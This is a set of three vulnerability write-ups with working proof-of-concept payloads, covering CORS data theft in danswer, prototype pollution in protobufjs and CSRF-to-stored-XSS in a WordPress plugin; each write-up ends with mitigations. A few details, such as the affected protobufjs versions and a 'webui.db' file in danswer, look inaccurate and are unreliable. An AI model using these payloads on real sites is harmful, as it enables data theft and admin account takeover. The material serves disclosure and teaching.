1. **CORS Misconfiguration**



**Title:** CORS Misconfiguration Leading to Sensitive Data Exposure in danswer-ai/danswer



**Summary:** The application contains a CORS misconfiguration that allows unauthorized external origins to make authenticated cross-origin requests. As a result, an attacker can steal sensitive user data, including chat history, and even access/download critical files such as webui.db. When a victim visits a malicious page, the attacker’s hosted script can read protected endpoints using the victim’s authenticated session.



**Steps to Reproduce (PoC):**

&nbsp;  1. Host the following HTML file (cors.html) on an attacker-controlled server.

&nbsp;  2. Send the hosted link to a logged-in victim.

&nbsp;  3. Once the victim clicks the link, the malicious script sends an authenticated cross-origin request to:

http://localhost:3000/api/manage/admin/connector/indexing-status

&nbsp; 4. Because of the misconfigured CORS policy, the victim’s browser allows the request and returns sensitive data.

&nbsp; 5. The attacker can alert the data or store it on their server.



**Payload Used:** Html Payload 


<html>

&nbsp;   <body>

&nbsp;       <h2>CORS PoC</h2>

&nbsp;       <div id="demo">

&nbsp;           <button type="button" onclick="cors()">Exploit</button>

&nbsp;       </div>

&nbsp;       <script>

&nbsp;           function cors() {

&nbsp;               var xhr = new XMLHttpRequest();

&nbsp;               xhr.onreadystatechange = function() {

&nbsp;                   if (this.readyState == 4 \&\& this.status == 200) {

&nbsp;                       document.getElementById("demo").innerHTML = alert(this.responseText);

&nbsp;                   }

&nbsp;               };

&nbsp;               xhr.open("GET",

&nbsp;                        "http://localhost:3000/api/manage/admin/connector/indexing-status", true);

&nbsp;               xhr.withCredentials = true;

&nbsp;               xhr.send();

&nbsp;           }

&nbsp;       </script>

&nbsp;   </body>

</html>



**Impact:**

* **Database Access:** Attackers can fetch sensitive admin APIs and potentially download database files such as webui.db.
* **Loss of Confidentiality:** Private user chats and personal information can be leaked to unauthorized third parties.
* **Service Disruption:** Unauthorized access to backend data could interrupt normal application functionality and damage trust.
* **Data Integrity Risks:** Attackers may manipulate or corrupt database records, causing data loss or operational disruption.



**Mitigation:**

* Enforce a strict CORS policy, explicitly whitelisting trusted domains only.
* Disable Access-Control-Allow-Credentials for endpoints that should not allow credentialed cross-origin requests.
* Block all untrusted origins and avoid using wildcard (\*) on sensitive endpoints.
* Implement server-side authentication checks that do not rely on CORS alone.



**Reference :** [**huntr/CORS Misconfiguration** ](https://huntr.com/bounties/5a95edd9-9a2e-4965-ac33-5217362fcfff)









**2. Prototype Pollution**



**Title:** Prototype Pollution in protobufjs Leading to RCE, DoS, and Security Bypass



**Summary:** A Prototype Pollution vulnerability exists in protobufjs (versions < 0.7.5), allowing attackers to modify the *Object.prototype* in the victim’s environment. By exploiting functions such as *parse()*, *setParsedOption()*, *util.setProperty()*, and *loadSync()*, an attacker can inject malicious properties into the prototype chain.

This results in remote code execution, denial of service, authentication bypass, and other critical attacks depending on how the affected application uses polluted objects.

The vulnerability was discovered by fuzzing using *Jazzer.js* and confirmed exploitable through several different code paths



**Steps to Reproduce (PoC):**

* **PoC 1** - Pollution via *protobuf.parse()*

&nbsp;     *const protobuf = require("protobufjs");*

      *protobuf.parse('option(a).constructor.prototype.verified = true;');*

     *console.log({}.verified);*



* <b>PoC 2</b> - Pollution via *ReflectionObject.setParsedOption()*

&nbsp;     *const protobuf = require("protobufjs");*

      *function gadgetFunction() {*

      *console.log("User is authenticated");*

      *}*

      *try {*

      *let obj = new protobuf.ReflectionObject("Test");*

      *obj.setParsedOption("unimportant!", gadgetFunction, "constructor.prototype.testFn");*

      *} catch (e) {}*

      *({}).testFn();*



* **PoC 3** - Pollution using *util.setProperty()*

&nbsp;     *const protobuf = require("protobufjs");*

      *protobuf.util.setProperty({}, "constructor.prototype.verified", true);*

      *console.log({}.verified);*



* <b>PoC 4</b> - Pollution using *loadSync()* with malicious .proto

&nbsp;     poc.proto: 

&nbsp;      *option(foo).constructor.prototype.verified = true;*

&nbsp;     Exploit: 

&nbsp;      *const protobuf = require("protobufjs");*

       *protobuf.loadSync("poc.proto");*

       *console.log({}.verified);*



<b>Payload Used: </b>

1. Generic Prototype Pollution Payload

      *constructor.prototype.<property> = <value>*



2\. Base64 payload generated by Jazzer.js

&nbsp;     eyJjb25zLl9fcHJvdG9fXy50cmUwIjogeyJwcnIiOiAidGEifX0=



**Impact:**

Severity: High

Exploitation allows attackers to:

* Remote Code Execution (RCE)
* Injected functions can be executed across all objects.
* Denial of Service (DoS)

&nbsp;     Overwriting built-ins like *toString()* causes app freezes.

* Authentication / Authorization Bypass

&nbsp;     Polluted properties like *isAdmin*, verified, or authenticated apply to all objects.

* Privilege Escalation

&nbsp;     Attackers trigger functions placed in prototype

* Cross-Site Scripting (XSS)

&nbsp;     If polluted attributes interact with HTML sinks.

* Global Logic Corruption

&nbsp;     All objects inherit malicious values → catastrophic integrity loss.

* Since the pollution modifies *Object.prototype*, the impact propagates through the entire application.



**Mitigation:**

1\. Upgrade protobufjs

2\. Sanitize all user-controlled keys

3\. Use safe object creation

4\. Avoid unsafe deep merge functions

5\. Use Maps instead of objects to Key Storage 



**Reference :** [**intelligence/prototype-pollution**](https://www.code-intelligence.com/blog/cve-protobufjs-prototype-pollution-cve-2023-36665)









**3. CSRF** 



**Title:** CSRF to Stored XSS Vulnerability in WordPress Simple User Profile Plugin



**Summary:** The Simple User Profile WordPress plugin (versions up to 1.9) is vulnerable to a Cross-Site Request Forgery (CSRF) issue that allows an attacker to inject Stored XSS payloads into user profile fields.

Because the plugin does not implement proper nonce validation or CSRF protections, an attacker can trick an authenticated user (including admins) into visiting a malicious page. When the CSRF request executes, the attacker’s payload gets stored inside the profile data. The payload then executes every time the profile is viewed in the WordPress admin panel or public pages (depending on configuration).



**Steps to Reproduce (PoC):**

**1. Prerequisites:**

&nbsp;    1. Victim must be logged in to WordPress.

&nbsp;    2. Plugin Simple User Profile ≤ 1.9 must be installed \& active.



**2. PoC Steps:**

&nbsp;    1. Create a malicious HTML page containing the CSRF form.

&nbsp;    2. Host the page on an attacker-controlled domain.

&nbsp;    3. Lure the authenticated victim to visit the attacker’s page.

&nbsp;    4. The form auto-submits and updates the victim’s profile with an XSS payload.

&nbsp;    5. Payload will execute when the profile is viewed.



**Payload Used (CSRF + Stored XSS):** CSRF Exploit Page

*<html>*

  *<body onload="document.csrf.submit()">*

    *<form name="csrf" action="https://victim-site.com/wp-admin/profile.php" method="POST">*

      *<input type="hidden" name="first\_name" value='"><script>alert(`XSS`)</script>'>*

      *<input type="hidden" name="last\_name" value="test">*

      *<input type="hidden" name="nickname" value="test">*

    *</form>*

  *</body>*

*</html>*



<b>Result:</b>

* The Stored XSS payload is permanently injected into a user profile.
* Displays an alert or executes attacker code whenever profile data is rendered.



**Impact:**

Severity: High 

What an attacker can do:

* **Stored XSS Execution**

&nbsp;      Payload runs every time the profile is viewed in admin dashboard.

* **Account Takeover (Admin-Level)**

&nbsp;      Stored XSS can steal admin cookies, perform admin actions, or create rogue accounts.

* **Privilege Escalation**

&nbsp;      Non-admin users can escalate privileges via malicious stored JS.

* **CSRF Exploitation Without User Interaction (besides visiting a page)**

&nbsp;      One click compromise.

* **Persistent Infection**

&nbsp;      Payload stays in DB until manually removed.



**Mitigation:**

* Implement proper WordPress nonce checks (wp\_nonce\_field, check\_admin\_referer).
* Validate and sanitize all profile inputs using:

&nbsp;       *1. sanitize\_text\_field()*

        *2. esc\_html()*

        *3. esc\_attr()*

* Prevent HTML/JS in profile fields unless explicitly needed.



**Reference:** [**nist/CSRF**](https://nvd.nist.gov/vuln/detail/CVE-2025-25140)





